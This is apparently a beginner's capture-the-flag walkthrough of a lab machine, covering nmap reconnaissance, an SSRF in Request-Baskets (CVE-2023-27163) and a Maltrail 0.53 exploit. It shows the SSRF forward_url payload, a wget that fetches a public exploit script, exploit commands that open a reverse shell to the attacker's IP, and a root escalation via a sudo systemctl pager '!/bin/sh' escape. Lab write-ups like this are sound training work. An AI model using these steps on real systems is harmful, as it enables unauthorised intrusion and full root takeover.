I start as I do allways, making a folder with the name of the target, another three of nmap, exploits and content.

I started the scann and I found a :
22 ssh port open
55555 port open (a request baskets) 

I had to do another scan, that I really dont like to do ,because at first time I Only watched the 22 port open

```
nmap -sV -sC -v (this scanns all the ports usually I do this one with just a selected ports)
```
This is what i get with what web
```
http://10.10.11.224:55555 [302 Found] Country[RESERVED][ZZ], IP[10.10.11.224], RedirectLocation[/web]
http://10.10.11.224:55555/web [200 OK] Bootstrap[3.3.7], Country[RESERVED][ZZ], HTML5, IP[10.10.11.224], JQuery[3.2.1], PasswordField, Script, Title[Request Baskets]
```

This is the info of all the scan
```
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
55555/tcp open     unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Wed, 06 Sep 2023 15:49:06 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Wed, 06 Sep 2023 15:48:21 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Wed, 06 Sep 2023 15:48:25 GMT
|_    Content-Length: 0

```

I will try this script too, this enumerates http directions on the target (when I give it the 55555 this wasn't a good request)
```
nmap --script http-enum 10.10.11.224 -oN webscan
```
and this way do not work too

```
nmap -p 55555 --script  http-enum 10.10.11.224 -oN webscan -vvv
```




The launchpad of this ubuntu seems to be "focal" 
```
OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
```


On searchsploit I found this exploit 

```
Request-Baskets v1.2.1 - Server-side request forgery (SSRF)                             | python/webapps/51675.sh

```
We have a port filtered,  the 80 so I think if i be able to use this one , I will be able to see it 







## What is request basket? ##
This is request-basket , from https://github.com/darklynx/request-baskets

[Request Baskets](https://rbaskets.in/) is a web service to collect arbitrary HTTP requests and inspect them via RESTful API or simple web UI.

It is strongly inspired by ideas and application design of the [RequestHub](https://github.com/kyledayton/requesthub) project and reproduces functionality offered by [RequestBin](http://requestb.in/) service.




This website explains the vulnerability
https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3

Now , i wanna know what is Proof of Concept (_PoC_)

This is the "way" to attack:

```
[Attack Vectors]
POC: POST /api/baskets/{name} API with payload - {"forward_url": "http://127.0.0.1:80/test","proxy_response": false,"insecure_tls": false,"expand_path": true,"capacity": 250}
details can be seen: https://notes.sjtu.edu.cn/s/MUUhEymt7
```


So, the way that I can go and exploit it was from this github repository

https://github.com/entr0pie/CVE-2023-27163

First I had to get the exploit with 

```
wget https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/main/CVE-2023-27163.sh
```
The second thing that I must do is use it

the command -h shows this
```
Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163

Usage: CVE-2023-27163.sh <URL> <TARGET>

This PoC will create a vulnerable basket on a Request-Baskets (<= 1.2.1) server,
which will act as a proxy to other services and servers.

Arguments:
 URL            main path (/) of the server (eg. http://127.0.0.1:5000/)
 TARGET         r-baskets target server (eg. https://b5f5-138-204-24-206.ngrok-free.app/)
```

This was the way that I use the exploit. The frist argument was the url that I was attacking, and the second one I just put a 127.0.0.1:80 my loopback link. I put to work a python3 server but strangely it works even if i do not use it... Im a fkn noob.. so I want to understand this. Thinking it better, It have no sense because the python server wasn't were working on the 127.0.0.1... I still do not understanding the second argument... 
```
./CVE-2023-27163.sh http://10.10.11.224:55555 http://127.0.0.1:80

```
but well... finally it worked, this was the output
```
> Creating the "jlrpcv" proxy basket...
> Basket created!
> Accessing http://10.10.11.224:55555/jlrpcv now makes the server request to http://127.0.0.1:80.
./CVE-2023-27163.sh: line 43: jq: command not found
> Response body (Authorization): {"token":"j8MDsCOZw1ztgTGYVvyBKpA7o_ruAfEtBwaylD3WAVtg"}

```
And wen I get on that link (http://10.10.11.224:55555/jlrpcv) I found a ugly website

![[Screenshot_2023-09-06_14_43_08.png]]
The port 80 was filtered, so... maybe this is the service running on that port.

whatweb gives me this, i think nothing interesting

```
http://10.10.11.224:55555/fvvtdd [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Maltrail/0.53], IP[10.10.11.224], Script[text/javascript], Title[Maltrail], UncommonHeaders[content-security-policy], X-UA-Compatible[IE=edge]
```
The most interesting thing about this site is this 

```
Powered by Maltrail (v0.53)
```
Maybe this thing have some kind of exploit , the source page doesn't revealed me nothing strange ... for me.

I found searching on websites  an exploit, maybe it works for me to get a reverse shell.
https://github.com/spookier/Maltrail-v0.53-Exploit

I must do this...maybe i need to put netcat to listen first

```
python3 exploit.py 1.2.3.4 1337 http://example.com
```
So the payload would be like this

```
python3 exploit.py 10.10.16.28 http://10.10.11.224:55555/fvvtdd
```

This doesnt work.... This is because reading a little. I found that the target to the attack is "username" so, we must attack the 127.0.0.1:80/login ... So, the two parameters of the attack that i was doubting before they are for the same target... and the 127.0.0.1 its the local net of the machine because of this, is a SSRF. 

We need to do another token to the 127.0.0.1:80/login and then attack it with the python exploit
```
Kali> ./CVE-2023-27163.sh http://10.10.11.224:55555 http://127.0.0.1:80/login
```
the output
```
> Creating the "cblhah" proxy basket...
> Basket created!
> Accessing http://10.10.11.224:55555/cblhah now makes the server request to http://127.0.0.1:80/login.
./CVE-2023-27163.sh: line 43: jq: command not found
> Response body (Authorization): {"token":"VntKnhP5XJXj08loblvmwZhZSBfMtzGCbqV7lC9dkhkI"}
```
and we run the exploit
```
python3 exploit.py 10.10.16.28 http://10.10.11.224:55555/cblhah
```

AND IT WOOORKSS !!!

We make a little treatment to the tty 
```
kali>script /dev/null -c bash

kali>stty raw -echo;fg

kali>reset xterm

kali>export TERM=xterm
```

We are "puma"
```
puma@sau:/opt/maltrail$ whoami
puma
puma@sau:/opt/maltrail$ 
```


puma can execute this as sudo without passowor (I use sudo -l to guess)

```
/usr/bin/systemctl status trail.service
```

when you execute this, you can write , because it is like "less" on the command line of linux, so instead of moving the arrows up or down just I write this:

```
!/bin/sh
```

and now i'm root and i can get the flag